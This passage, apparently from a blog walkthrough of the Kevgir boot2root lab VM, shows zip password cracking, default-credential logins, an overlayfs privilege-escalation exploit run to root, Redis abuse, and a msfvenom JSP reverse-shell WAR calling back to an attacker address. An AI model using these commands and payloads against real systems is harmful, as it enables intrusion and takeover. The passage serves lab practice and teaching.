<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip --help
</span><span class='line'>
</span><span class='line'>fcrackzip version 1.0, a fast/free zip password cracker
</span><span class='line'>written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on
</span><span class='line'>http://www.goof.com/pcg/marc/
</span><span class='line'>
</span><span class='line'>USAGE: fcrackzip
</span><span class='line'>          [-b|--brute-force]            use brute force algorithm
</span><span class='line'>          [-D|--dictionary]             use a dictionary
</span><span class='line'>          [-B|--benchmark]              execute a small benchmark
</span><span class='line'>          [-c|--charset characterset]   use characters from charset
</span><span class='line'>          [-h|--help]                   show this message
</span><span class='line'>          [--version]                   show the version of this program
</span><span class='line'>          [-V|--validate]               sanity-check the algortihm
</span><span class='line'>          [-v|--verbose]                be more verbose
</span><span class='line'>          [-p|--init-password string]   use string as initial password/file
</span><span class='line'>          [-l|--length min-max]         check password with length min to max
</span><span class='line'>          [-u|--use-unzip]              use unzip to weed out wrong passwords
</span><span class='line'>          [-m|--method num]             use method number "num" (see below)
</span><span class='line'>          [-2|--modulo r/m]             only calculcate 1/m of the password
</span><span class='line'>          file...                    the zipfiles to crack
</span><span class='line'>
</span><span class='line'>methods compiled in (* = default):
</span><span class='line'>
</span><span class='line'> 0: cpmask
</span><span class='line'> 1: zip1
</span><span class='line'>*2: zip2, USE_MULT_TAB</span></code></pre></td></tr></table></div></figure>


<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip -b -u -v backup.tar.bz2.zip 
</span><span class='line'>found file 'backup.tar.bz2', (size cp/uc 13057834/13076586, flags 9, chk 28e3)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: pw == aaaaaa</span></code></pre></td></tr></table></div></figure>


<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls
</span><span class='line'>dvwa  gentleman  index.html  web-standards  zenphoto</span></code></pre></td></tr></table></div></figure>


<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 4.1.6-Ubuntu)
</span><span class='line'>|   Computer name: canyoupwnme
</span><span class='line'>|   NetBIOS computer name: CANYOUPWNME\x00
</span><span class='line'>|   Domain name: 
</span><span class='line'>|   FQDN: canyoupwnme
</span><span class='line'>|_  System time: 2017-12-02T21:15:36+02:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>| smb2-security-mode: 
</span><span class='line'>|   2.02: 
</span><span class='line'>|_    Message signing enabled but not required
</span><span class='line'>| smb2-time: 
</span><span class='line'>|   date: 2017-12-02 14:15:37
</span><span class='line'>|_  start_date: 1600-12-31 19:03:58</span></code></pre></td></tr></table></div></figure>


<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
</span><span class='line'>|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
</span><span class='line'>|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
</span><span class='line'>|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)</span></code></pre></td></tr></table></div></figure>


<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/issue
</span><span class='line'>Ubuntu 14.04.3 LTS \n \l</span></code></pre></td></tr></table></div></figure>


<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin@canyoupwnme:~$ ./overlayfs 
</span><span class='line'>root@canyoupwnme:~# id
</span><span class='line'>uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
</span><span class='line'>root@canyoupwnme:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>Redis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>6379/tcp  open  redis       Redis key-value store 3.0.7</span></code></pre></td></tr></table></div></figure>


<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>
</span><span class='line'>Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
</span><span class='line'>  -h &lt;hostname&gt;      Server hostname (default: 127.0.0.1).
</span><span class='line'>  -p &lt;port&gt;          Server port (default: 6379).
</span><span class='line'>  -s &lt;socket&gt;        Server socket (overrides hostname and port).
</span><span class='line'>  -a &lt;password&gt;      Password to use when connecting to the server.
</span><span class='line'>  -r &lt;repeat&gt;        Execute specified command N times.
</span><span class='line'>  -i &lt;interval&gt;      When -r is used, waits &lt;interval&gt; seconds per command.
</span><span class='line'>                     It is possible to specify sub-second times like -i 0.1.
</span><span class='line'>  -n &lt;db&gt;            Database number.
</span><span class='line'>  -x                 Read last argument from STDIN.
</span><span class='line'>  -d &lt;delimiter&gt;     Multi-bulk delimiter in for raw formatting (default: \n).
</span><span class='line'>  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
</span><span class='line'>  --raw              Use raw formatting for replies (default when STDOUT is
</span><span class='line'>                     not a tty).
</span><span class='line'>  --no-raw           Force formatted output even when STDOUT is not a tty.
</span><span class='line'>  --csv              Output in CSV format.
</span><span class='line'>  --stat             Print rolling stats about server: mem, clients, ...
</span><span class='line'>  --latency          Enter a special mode continuously sampling latency.
</span><span class='line'>                     If you use this mode in an interactive session it runs
</span><span class='line'>                     forever displaying real-time stats. Otherwise if --raw or
</span><span class='line'>                     --csv is specified, or if you redirect the output to a non
</span><span class='line'>                     TTY, it samples the latency for 1 second (you can use
</span><span class='line'>                     -i to change the interval), then produces a single output
</span><span class='line'>                     and exits.
</span><span class='line'>  --latency-history  Like --latency but tracking latency changes over time.
</span><span class='line'>                     Default time interval is 15 sec. Change it using -i.
</span><span class='line'>  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.
</span><span class='line'>                     Default time interval is 1 sec. Change it using -i.
</span><span class='line'>  --lru-test &lt;keys&gt;  Simulate a cache workload with an 80-20 distribution.
</span><span class='line'>  --slave            Simulate a slave showing commands received from the master.
</span><span class='line'>  --rdb &lt;filename&gt;   Transfer an RDB dump from remote server to local file.
</span><span class='line'>  --pipe             Transfer raw Redis protocol from stdin to server.
</span><span class='line'>  --pipe-timeout &lt;n&gt; In --pipe mode, abort with error if after sending all data.
</span><span class='line'>                     no reply is received within &lt;n&gt; seconds.
</span><span class='line'>                     Default timeout: 30. Use 0 to wait forever.
</span><span class='line'>  --bigkeys          Sample Redis keys looking for big keys.
</span><span class='line'>  --scan             List all keys using the SCAN command.
</span><span class='line'>  --pattern &lt;pat&gt;    Useful with --scan to specify a SCAN pattern.
</span><span class='line'>  --intrinsic-latency &lt;sec&gt; Run a test to measure intrinsic system latency.
</span><span class='line'>                     The test will run for the specified amount of seconds.
</span><span class='line'>  --eval &lt;file&gt;      Send an EVAL command using the Lua script at &lt;file&gt;.
</span><span class='line'>  --ldb              Used with --eval enable the Redis Lua debugger.
</span><span class='line'>  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in
</span><span class='line'>                     this mode the server is blocked and script changes are
</span><span class='line'>                     are not rolled back from the server memory.
</span><span class='line'>  --help             Output this help and exit.
</span><span class='line'>  --version          Output version and exit.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  cat /etc/passwd | redis-cli -x set mypasswd
</span><span class='line'>  redis-cli get mypasswd
</span><span class='line'>  redis-cli -r 100 lpush mylist x
</span><span class='line'>  redis-cli -r 100 -i 1 info | grep used_memory_human:
</span><span class='line'>  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
</span><span class='line'>  redis-cli --scan --pattern '*:12345*'
</span><span class='line'>
</span><span class='line'>  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)
</span><span class='line'>
</span><span class='line'>When no command is given, redis-cli starts in interactive mode.
</span><span class='line'>Type "help" in interactive mode for information on available commands
</span><span class='line'>and settings.</span></code></pre></td></tr></table></div></figure>


<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h 192.168.217.128
</span><span class='line'>192.168.217.128:6379&gt; help
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>To get help about Redis commands type:
</span><span class='line'>      "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
</span><span class='line'>      "help &lt;command&gt;" for help on &lt;command&gt;
</span><span class='line'>      "help &lt;tab&gt;" to get a list of possible help topics
</span><span class='line'>      "quit" to exit
</span><span class='line'>
</span><span class='line'>To set redis-cli preferences:
</span><span class='line'>      ":set hints" enable online hints
</span><span class='line'>      ":set nohints" disable online hints
</span><span class='line'>Set your preferences in ~/.redisclirc
</span><span class='line'>192.168.217.128:6379&gt; info
</span><span class='line'># Server
</span><span class='line'>redis_version:3.0.7
</span><span class='line'>redis_git_sha1:00000000
</span><span class='line'>redis_git_dirty:0
</span><span class='line'>redis_build_id:aa70bcb321ba8313
</span><span class='line'>redis_mode:standalone
</span><span class='line'>os:Linux 3.19.0-25-generic i686
</span><span class='line'>arch_bits:32
</span><span class='line'>multiplexing_api:epoll
</span><span class='line'>gcc_version:4.8.4
</span><span class='line'>process_id:1263
</span><span class='line'>run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
</span><span class='line'>tcp_port:6379
</span><span class='line'>uptime_in_seconds:3235
</span><span class='line'>uptime_in_days:0
</span><span class='line'>hz:10
</span><span class='line'>lru_clock:2368010
</span><span class='line'>config_file:/etc/redis/6379.conf
</span><span class='line'>
</span><span class='line'># Clients
</span><span class='line'>connected_clients:1
</span><span class='line'>client_longest_output_list:0
</span><span class='line'>client_biggest_input_buf:0
</span><span class='line'>blocked_clients:0
</span><span class='line'>
</span><span class='line'># Memory
</span><span class='line'>used_memory:637624
</span><span class='line'>used_memory_human:622.68K
</span><span class='line'>used_memory_rss:8929280
</span><span class='line'>used_memory_peak:637624
</span><span class='line'>used_memory_peak_human:622.68K
</span><span class='line'>used_memory_lua:24576
</span><span class='line'>mem_fragmentation_ratio:14.00
</span><span class='line'>mem_allocator:jemalloc-3.6.0
</span><span class='line'>
</span><span class='line'># Persistence
</span><span class='line'>loading:0
</span><span class='line'>rdb_changes_since_last_save:0
</span><span class='line'>rdb_bgsave_in_progress:0
</span><span class='line'>rdb_last_save_time:1512314215
</span><span class='line'>rdb_last_bgsave_status:ok
</span><span class='line'>rdb_last_bgsave_time_sec:-1
</span><span class='line'>rdb_current_bgsave_time_sec:-1
</span><span class='line'>aof_enabled:0
</span><span class='line'>aof_rewrite_in_progress:0
</span><span class='line'>aof_rewrite_scheduled:0
</span><span class='line'>aof_last_rewrite_time_sec:-1
</span><span class='line'>aof_current_rewrite_time_sec:-1
</span><span class='line'>aof_last_bgrewrite_status:ok
</span><span class='line'>aof_last_write_status:ok
</span><span class='line'>
</span><span class='line'># Stats
</span><span class='line'>total_connections_received:2
</span><span class='line'>total_commands_processed:2
</span><span class='line'>instantaneous_ops_per_sec:0
</span><span class='line'>total_net_input_bytes:41
</span><span class='line'>total_net_output_bytes:6067614
</span><span class='line'>instantaneous_input_kbps:0.00
</span><span class='line'>instantaneous_output_kbps:0.00
</span><span class='line'>rejected_connections:0
</span><span class='line'>sync_full:0
</span><span class='line'>sync_partial_ok:0
</span><span class='line'>sync_partial_err:0
</span><span class='line'>expired_keys:0
</span><span class='line'>evicted_keys:0
</span><span class='line'>keyspace_hits:0
</span><span class='line'>keyspace_misses:0
</span><span class='line'>pubsub_channels:0
</span><span class='line'>pubsub_patterns:0
</span><span class='line'>latest_fork_usec:0
</span><span class='line'>migrate_cached_sockets:0
</span><span class='line'>
</span><span class='line'># Replication
</span><span class='line'>role:master
</span><span class='line'>connected_slaves:0
</span><span class='line'>master_repl_offset:0
</span><span class='line'>repl_backlog_active:0
</span><span class='line'>repl_backlog_size:1048576
</span><span class='line'>repl_backlog_first_byte_offset:0
</span><span class='line'>repl_backlog_histlen:0
</span><span class='line'>
</span><span class='line'># CPU
</span><span class='line'>used_cpu_sys:3.71
</span><span class='line'>used_cpu_user:1.60
</span><span class='line'>used_cpu_sys_children:0.00
</span><span class='line'>used_cpu_user_children:0.00
</span><span class='line'>
</span><span class='line'># Cluster
</span><span class='line'>cluster_enabled:0
</span><span class='line'>
</span><span class='line'># Keyspace
</span><span class='line'>192.168.217.128:6379&gt; </span></code></pre></td></tr></table></div></figure>


<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat</span></code></pre></td></tr></table></div></figure>


<p>Time to look at that Tomcat server!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h http://192.168.217.128:8080/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.128
</span><span class='line'>+ Target Hostname:    192.168.217.128
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2017-12-03 12:21:45 (GMT-5)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
</span><span class='line'>+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /manager/status: Tomcat Server Status interface found (pass protected)
</span><span class='line'>+ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
</span><span class='line'>+ End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/manager-fullpage.png" title="manager" alt="tomcat web application manager"></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
</span><span class='line'>Payload size: 1099 bytes
</span><span class='line'>Final size of war file: 1099 bytes
</span><span class='line'>Saved as: runme.war</span></code></pre></td></tr></table></div></figure>


<p>Check what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jar -tf runme.war 
</span><span class='line'>WEB-INF/
</span><span class='line'>WEB-INF/web.xml
</span><span class='line'>kndeoavjwgjs.jsp</span></code></pre></td></tr></table></div></figure>


<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
</span><span class='line'>whoami
</span><span class='line'>tomcat7</span></code></pre></td></tr></table></div></figure>


<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-generator: Joomla! 1.5 - Open Source Content Management
</span><span class='line'>| http-robots.txt: 14 disallowed entries 
</span><span class='line'>| /administrator/ /cache/ /components/ /images/ 
</span><span class='line'>| /includes/ /installation/ /language/ /libraries/ /media/ 
</span><span class='line'>|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Welcome to the Frontpage</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/8081.jpg" title="joomla" alt="joomla"></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>* The Exact version found is 1.5.1
</span><span class='line'># 15
</span><span class='line'>Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability 
</span><span class='line'>Versions Affected: 1.5.5 &lt;= 
</span><span class='line'>Check: /components/com_user/controller.php
